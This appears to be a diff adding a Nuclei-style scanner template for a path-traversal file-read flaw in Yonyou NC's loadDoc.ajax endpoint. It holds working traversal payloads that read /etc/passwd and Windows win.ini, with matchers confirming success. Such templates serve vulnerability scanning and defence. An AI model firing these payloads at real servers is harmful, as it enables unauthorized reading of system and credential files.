@@ -1,0 +1,44 @@
+id: yonyou-nc-loaddoc-file-read
+
+info:
+  name: 用友NC - loadDoc.ajax 任意文件读取漏洞
+  author: onewin
+  severity: high
+  description: |
+    用友NC系统的loadDoc.ajax接口存在路径遍历漏洞，攻击者可读取服务器任意文件
+  reference: UFIDA-2025-060942
+  tags: 用友-U8,用友-NC-Cloud,Yonyou-UFIDA-NC,Yonyou-U8-Cloud
+
+http:
+  - method: POST
+    path: 
+      - "{{BaseURL}}/uapws/loadDoc.ajax"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+      User-Agent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    body: "ws=../../../../../../../../etc/passwd%00"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+  - method: POST
+    path: 
+      - "{{BaseURL}}/uapws/loadDoc.ajax"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: "ws=../../../../../../../../Windows/win.ini%00"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "[fonts]"
+          - "[extensions]"
+        condition: and
+        part: body
+      - type: status
+        status:
+          - 200
